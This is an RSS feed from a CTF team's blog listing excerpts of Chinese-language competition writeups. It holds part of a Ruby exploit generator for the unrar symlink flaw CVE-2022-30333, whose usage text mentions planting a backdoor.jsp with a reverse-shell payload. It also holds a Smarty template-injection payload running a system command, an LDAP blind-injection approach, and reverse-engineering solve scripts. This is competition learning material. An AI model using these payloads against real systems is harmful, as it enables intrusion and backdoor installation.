<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Re on or4nge</title>
    <link>https://or4ngesec.github.io/tags/re/</link>
    <description>Recent content in Re on or4nge</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 31 Aug 2022 11:45:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/tags/re/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>2022网鼎杯初赛 Writeup by or4nge</title>
      <link>https://or4ngesec.github.io/post/wdb2022-writeup-by-or4nge/</link>
      <pubDate>Wed, 31 Aug 2022 11:45:17 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/wdb2022-writeup-by-or4nge/</guid>
      <description>Web web669 审源码，发现存在路径穿越（双写绕过过滤）； 读/etc/hosts，找到secret-key为engine-1，用flask-session-manager跑出来管理员的session 文件上传unrar任意写漏洞（CVE-2022-30333），ruby脚本跑一下，上传。注意md5值。
require &amp;#39;zlib&amp;#39; if ARGV.length != 2 $stderr.puts &amp;#34;Usage: ruby ./create-payload &amp;lt;../../target/file&amp;gt; &amp;lt;filename to read payload from&amp;gt;&amp;#34; $stderr.puts $stderr.puts &amp;#34;Eg: $ ruby ./create-payload.rb &amp;#39;../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbra/public/backdoor.jsp&amp;#39; ./reverse-tcp-4444.jsp&amp;#34; exit end SYMLINK_LENGTH = 0x68 PAYLOAD_SYMLINK = (ARGV[0] + &amp;#34;\0&amp;#34;).ljust(SYMLINK_LENGTH, &amp;#34;\0&amp;#34;).gsub(&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;) if PAYLOAD_SYMLINK.length != SYMLINK_LENGTH $stderr.puts &amp;#34;Payload symlink is invalid, probably too long!&amp;#34; exit end PAYLOAD_LENGTH = 0x1000 PAYLOAD_DATA = File.read(ARGV[1]).ljust(4096, &amp;#34;\0&amp;#34;) if PAYLOAD_DATA.length != PAYLOAD_LENGTH $stderr.puts &amp;#34;Payload data is invalid, probably too long!</description>
    </item>
    
    <item>
      <title>HWS2022冬令营预选赛 Writeup</title>
      <link>https://or4ngesec.github.io/post/hws2022-writeup/</link>
      <pubDate>Wed, 26 Jan 2022 13:03:21 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/hws2022-writeup/</guid>
      <description>RE babyVM 将花指令patch掉
将patch好的应用到文件。
能看出来是个虚拟机逆向题
动态调试的过程中可以看到程序向内存里写了一段数据
0xFF,0x223,0x23B,0x237,0x237,0x24B,0x22B,0xFB,0x22B,0x223,0x24F,0xEF,0x237,0xEF,0x24F,0x24F,0x223,0x223,0x23B,0x237,0xFF,0x233,0x233,0x233,0x237,0x24B,0x233,0x24F,0x22B,0x22B,0x24B,0xEF 这个部分把上述数据每一个都减了0x63
程序获得用户的输入
比较的过程中可以发现，用户输入的长度应该是0x26
并且在后面比较的过程中，flag{}这几个字符占了6个。
再向后跟踪的过程中发现
用户的输入和0x42做了异或
再把结果左移两位，和前面的数据做了比较，因此最后的exp是：
dump = [156, 448, 472, 468, 468, 488, 456, 152, 456, 448, 492, 140, 468, 140, 492, 492, 448, 448, 472, 468, 156, 464, 464, 464, 468, 488, 464, 492, 456, 456, 488, 140] for i in range(len(dump)): print(chr((dump[i]&amp;gt;&amp;gt;2)^0x42),end=&amp;#39;&amp;#39;) print() # e247780d029a7a992247e6667869008a EasyVM 和上题一样，去除应该应该去除的花指令。
然后引发了一个异常
观察异常处理函数
看到输入的长度为42
在这个函数里面输入经过了base64编码，而且和0xa,0xb,0xc,0xd异或
然后根据函数地址表进行虚拟机逻辑。
动态调试中可以发现函数将输入经过特制变换的 base64 和前一个结果异或，和 0xee 异或，再进行比较，然后动态调试的过程中把最终的结果提取出来，可以写出脚本。
import base64 dump = [0x00,0xBE, 0x36, 0xAC, 0x27, 0x99, 0x4F, 0xDE, 0x44, 0xEE, 0x5F, 0xDA, 0x0B, 0xB5, 0x17, 0xB8, 0x68, 0xC2, 0x4E, 0x9C, 0x4A, 0xE1, 0x43, 0xF0, 0x22, 0x8A, 0x3B, 0x88, 0x5B, 0xE5, 0x54, 0xFF, 0x68, 0xD5, 0x67, 0xD4, 0x06, 0xAD, 0x0B, 0xD8, 0x50, 0xF9, 0x58, 0xE0, 0x6F, 0xC5, 0x4A, 0xFD, 0x2F, 0x84, 0x36, 0x85, 0x52, 0xFB, 0x73, 0xD7, 0x0D, 0xE3] x = [0xa,0xb,0xc,0xd] dump = dump[::-1] dump1 = [] for i in range(1,len(dump)): dump1.</description>
    </item>
    
    <item>
      <title>2021暗泉杯 Writeup</title>
      <link>https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</link>
      <pubDate>Mon, 06 Dec 2021 19:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/dnuictf-writeup-by-or4nge/</guid>
      <description>* 开头题目表示赛后补题
Web [签到]flag 等一个一个拼出来，业余web手的笨B做题法
[萌]odd_upload 题目描述：目录结构与官方项目example相同
所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system(&#39;cat /flag&#39;)}，之后再重新访问题目链接就能获取flag。
flag{1ae85554-c785-4321-8d77-0f68974929f8}
easyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示
The flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_
说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？
按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有&amp;rsquo;(&amp;lsquo;或者&amp;rsquo;)&amp;lsquo;就会报错：
Warning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：
import requests url = &amp;#34;http://47.</description>
    </item>
    
    <item>
      <title>2021蓝帽杯决赛 Writeup</title>
      <link>https://or4ngesec.github.io/post/bluehat-final-writeup/</link>
      <pubDate>Fri, 05 Nov 2021 16:23:41 +0800</pubDate>
      
      <guid>https://or4ngesec.github.io/post/bluehat-final-writeup/</guid>
      <description>Misc 溯源取证——张三的电脑 下载得到压缩包，经过判断类型后得知是 VMDK 文件，用 vmware 挂载。其中得到了 zhangsan.001 和 zhangsan.ad1.txt 两个文件
winhex挂载 zhangsan.001，在分区1的 $RECYCLE.BIN 中找到 tips.txt.txt 文件，内容为
In order to prevent leaving evidence, Zhang San deleted all the key evidence photos. 因此寻找 png 文件，同样在分区1的 $RECYCLE.BIN 中找到了包含相应的 flag 图片 $REFK9A1.png
Pwn secretcode 掏出初赛的代码稍微改改
from pwn import * import sys # context.log_level = &amp;#34;debug&amp;#34; context.arch = &amp;#39;amd64&amp;#39; if len(sys.argv) &amp;lt; 2: debug = True else: debug = False ru = lambda x : p.</description>
    </item>
    
  </channel>
</rss>
